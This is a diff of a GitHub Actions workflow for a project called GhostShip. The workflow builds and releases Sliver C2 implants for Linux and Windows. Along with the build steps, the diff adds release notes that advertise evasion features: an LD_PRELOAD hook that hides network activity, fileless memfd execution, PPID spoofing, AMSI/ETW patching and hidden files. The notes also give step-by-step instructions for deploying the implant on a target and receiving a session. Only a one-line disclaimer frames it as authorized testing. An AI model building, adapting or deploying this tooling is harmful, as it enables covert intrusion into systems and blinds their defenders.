@@ -10,62 +10,347 @@ on:
     branches:
       - main
 
+env:
+  NODE_VERSION: "20.11.0"
+  SLIVER_VERSION: "1.5.42"
+
 jobs:
-  build:
-    name: Build and Release
+  build-linux:
+    name: Build Linux Implant
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
       - name: Checkout code
-        uses: actions/checkout@v3
+        uses: actions/checkout@v4
 
       - name: Set up Go
-        uses: actions/setup-go@v4
+        uses: actions/setup-go@v5
         with:
           go-version: '1.21'
 
-      - name: Sync Dependencies
+      - name: Install build dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y gcc
+
+      - name: Compile LD_PRELOAD hook library
+        run: |
+          cd implant/core/assets/native
+          gcc -shared -fPIC -o ../libgshook.so gshook.c -ldl
+          ls -lh ../libgshook.so
+          file ../libgshook.so
+
+      - name: Download Node.js Linux x64
+        run: |
+          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz" -o node-linux.tar.xz
+          tar -xf node-linux.tar.xz
+          mv node-v${NODE_VERSION}-linux-x64/bin/node node-linux
+          chmod +x node-linux
+          ls -lh node-linux
+
+      - name: Download Sliver and Generate Linux Implant
+        run: |
+          # Download Sliver server
+          curl -fsSL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-server_linux" -o sliver-server
+          chmod +x sliver-server
+
+          # Unpack Sliver assets (required for implant generation)
+          ./sliver-server unpack --force
+
+          # Start Sliver daemon in background
+          ./sliver-server daemon &
+          SLIVER_PID=$!
+          sleep 15
+
+          # Download Sliver client
+          curl -fsSL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-client_linux" -o sliver-client
+          chmod +x sliver-client
+
+          # Generate operator config
+          ./sliver-server operator --name ci-operator --lhost localhost --save ci-operator.cfg
+
+          # Generate Linux implant (mTLS to 127.0.0.1:8888 - intercepted by LD_PRELOAD hook)
+          ./sliver-client --config ci-operator.cfg <<EOF
+          generate --mtls 127.0.0.1:8888 --os linux --arch amd64 --format executable --skip-symbols --save /tmp/sliver-linux
+          exit
+          EOF
+
+          # Wait for generation
+          sleep 30
+
+          # Find generated implant
+          IMPLANT=$(find /tmp ~/.sliver-client -name "*.elf" -o -name "*linux*" -type f 2>/dev/null | grep -v ".go" | head -1)
+          if [ -z "$IMPLANT" ]; then
+            IMPLANT=$(find . -maxdepth 1 -type f -executable -name "*[A-Z]*" 2>/dev/null | head -1)
+          fi
+
+          if [ -n "$IMPLANT" ]; then
+            cp "$IMPLANT" sliver-implant-linux
+          else
+            echo "Searching for implant..."
+            find /tmp ~/.sliver-client . -type f 2>/dev/null | xargs file 2>/dev/null | grep -i elf | head -5
+            cp /tmp/sliver-linux sliver-implant-linux 2>/dev/null || \
+            cp $(ls -t ~/.sliver-client/saved/* 2>/dev/null | head -1) sliver-implant-linux 2>/dev/null
+          fi
+
+          chmod +x sliver-implant-linux
+          ls -lh sliver-implant-linux
+          file sliver-implant-linux
+
+          kill $SLIVER_PID 2>/dev/null || true
+
+      - name: Bundle Linux Assets
+        run: |
+          # Compress Node.js runtime
+          gzip -c node-linux > implant/core/assets/node.gz
+
+          # Compress Sliver payload
+          gzip -c sliver-implant-linux > implant/core/assets/payload.gz
+
+          # Verify all assets
+          echo "=== Assets ==="
+          ls -lh implant/core/assets/
+
+      - name: Build Linux Implant
         working-directory: implant
-        run: go mod tidy
+        run: |
+          go mod tidy
+          mkdir -p dist
+          CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o dist/ghostship-linux main.go
+          ls -lh dist/ghostship-linux
+          file dist/ghostship-linux
 
-      - name: Build Implants
+      - name: Upload Linux Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ghostship-linux
+          path: implant/dist/ghostship-linux
+
+  build-windows:
+    name: Build Windows Implant
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.21'
+
+      - name: Download Node.js Windows x64
+        run: |
+          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-win-x64.zip" -o node-windows.zip
+          unzip -q node-windows.zip
+          mv node-v${NODE_VERSION}-win-x64/node.exe node-windows.exe
+          ls -lh node-windows.exe
+
+      - name: Download Sliver and Generate Windows Implant
+        run: |
+          # Download Sliver server
+          curl -fsSL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-server_linux" -o sliver-server
+          chmod +x sliver-server
+
+          # Unpack Sliver assets
+          ./sliver-server unpack --force
+
+          # Start Sliver daemon
+          ./sliver-server daemon &
+          SLIVER_PID=$!
+          sleep 15
+
+          # Download Sliver client
+          curl -fsSL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-client_linux" -o sliver-client
+          chmod +x sliver-client
+
+          # Generate operator config
+          ./sliver-server operator --name ci-operator --lhost localhost --save ci-operator.cfg
+
+          # Generate Windows implant with Named Pipe transport
+          ./sliver-client --config ci-operator.cfg <<EOF
+          generate --named-pipe '\\\\.\\pipe\\gspipe' --os windows --arch amd64 --format executable --skip-symbols --save /tmp/sliver-windows
+          exit
+          EOF
+
+          sleep 30
+
+          # Find generated implant
+          IMPLANT=$(find /tmp ~/.sliver-client -name "*.exe" -type f 2>/dev/null | head -1)
+          if [ -z "$IMPLANT" ]; then
+            IMPLANT=$(find . -maxdepth 1 -type f -name "*[A-Z]*.exe" 2>/dev/null | head -1)
+          fi
+
+          if [ -n "$IMPLANT" ]; then
+            cp "$IMPLANT" sliver-implant-windows.exe
+          else
+            echo "Searching for implant..."
+            find /tmp ~/.sliver-client . -type f 2>/dev/null | xargs file 2>/dev/null | grep -i "PE32" | head -5
+            cp /tmp/sliver-windows sliver-implant-windows.exe 2>/dev/null || \
+            cp $(ls -t ~/.sliver-client/saved/*.exe 2>/dev/null | head -1) sliver-implant-windows.exe 2>/dev/null
+          fi
+
+          ls -lh sliver-implant-windows.exe
+          file sliver-implant-windows.exe
+
+          kill $SLIVER_PID 2>/dev/null || true
+
+      - name: Bundle Windows Assets
+        run: |
+          # Compress Node.js runtime
+          gzip -c node-windows.exe > implant/core/assets/node.gz
+
+          # Compress Sliver payload
+          gzip -c sliver-implant-windows.exe > implant/core/assets/payload.gz
+
+          # Use Windows-specific client
+          cp implant/core/assets/client-windows.js implant/core/assets/client.js
+
+          ls -lh implant/core/assets/
+
+      - name: Build Windows Implant
         working-directory: implant
         run: |
+          go mod tidy
           mkdir -p dist
-          # Linux Build
-          GOOS=linux GOARCH=amd64 go build -o dist/ghostship-linux main.go
-          # Windows Build
-          GOOS=windows GOARCH=amd64 go build -o dist/ghostship-windows.exe main.go
+          CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/ghostship-windows.exe main.go
+          ls -lh dist/ghostship-windows.exe
+          file dist/ghostship-windows.exe
 
-      - name: Sync Bridge Dependencies
-        working-directory: bridge/go
-        run: go mod tidy
+      - name: Upload Windows Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ghostship-windows
+          path: implant/dist/ghostship-windows.exe
 
-      - name: Build Bridge (Go)
+  build-bridge:
+    name: Build Bridge Components
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.21'
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Build Go Bridge
         working-directory: bridge/go
         run: |
+          go mod tidy
           mkdir -p dist
-          # Linux Build
-          GOOS=linux GOARCH=amd64 go build -o dist/bridge-linux main.go
-          # Windows Build
-          GOOS=windows GOARCH=amd64 go build -o dist/bridge-windows.exe main.go
+          CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o dist/bridge-linux main.go
+          CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/bridge-windows.exe main.go
+          ls -lh dist/
 
-      - name: Package Bridge (Node.js)
+      - name: Package Node.js Bridge
         run: |
+          cd bridge/nodejs
+          npm install --production
+          cd ../..
           zip -r bridge-nodejs.zip bridge/nodejs
 
-      - name: Create Release
-        if: startsWith(github.ref, 'refs/tags/')
-        uses: softprops/action-gh-release@v1
+      - name: Upload Bridge Artifacts
+        uses: actions/upload-artifact@v4
         with:
-          files: |
-            implant/dist/ghostship-linux
-            implant/dist/ghostship-windows.exe
+          name: bridge-components
+          path: |
             bridge/go/dist/bridge-linux
             bridge/go/dist/bridge-windows.exe
             bridge-nodejs.zip
+
+  release:
+    name: Create Release
+    needs: [build-linux, build-windows, build-bridge]
+    runs-on: ubuntu-latest
+    if: startsWith(github.ref, 'refs/tags/')
+    permissions:
+      contents: write
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+
+      - name: List artifacts
+        run: find artifacts -type f -ls
+
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
+        with:
+          files: |
+            artifacts/ghostship-linux/ghostship-linux
+            artifacts/ghostship-windows/ghostship-windows.exe
+            artifacts/bridge-components/bridge/go/dist/bridge-linux
+            artifacts/bridge-components/bridge/go/dist/bridge-windows.exe
+            artifacts/bridge-components/bridge-nodejs.zip
           name: GhostShip ${{ github.ref_name }}
+          body: |
+            ## GhostShip ${{ github.ref_name }}
+
+            ### Downloads
+
+            | File | Platform | Description |
+            |------|----------|-------------|
+            | `ghostship-linux` | Linux x64 | Implant with LD_PRELOAD stealth (no listening ports) |
+            | `ghostship-windows.exe` | Windows x64 | Implant with Named Pipe + PPID Spoofing + AMSI/ETW bypass |
+            | `bridge-linux` | Linux x64 | Operator-side P2P bridge |
+            | `bridge-windows.exe` | Windows x64 | Operator-side P2P bridge |
+            | `bridge-nodejs.zip` | Any | Node.js bridge alternative |
+
+            ### Quick Start
+
+            **1. Operator Setup:**
+            ```bash
+            # Terminal 1: Start Sliver C2
+            sliver-server
+            sliver > mtls --lport 8888
+
+            # Terminal 2: Start GhostShip bridge
+            ./bridge-linux --port 8888
+            # Output: Connection Key: hs://abc123...
+            ```
+
+            **2. Deploy on Target:**
+            ```bash
+            # Linux
+            ./ghostship-linux --connect "hs://abc123..."
+
+            # Windows (PowerShell)
+            .\ghostship-windows.exe --connect "hs://abc123..."
+            ```
+
+            **3. Receive Session:**
+            ```
+            sliver > sessions
+            [*] Session 1 - OBJECTIVE_HORSE - 192.168.1.100:0 (target) - linux/amd64
+            ```
+
+            ### Stealth Features
+
+            **Linux:**
+            - LD_PRELOAD hook intercepts Sliver TCP, redirects to socketpair
+            - No listening TCP ports (`netstat` shows nothing)
+            - memfd execution (fileless)
+
+            **Windows:**
+            - Named Pipe transport (no TCP)
+            - PPID Spoofing (appears as child of svchost.exe)
+            - AMSI/ETW patching (blind telemetry)
+            - Hidden directory + files
+
+            ### Disclaimer
+            For authorized security research and penetration testing only.
           draft: false
           prerelease: true
         env:
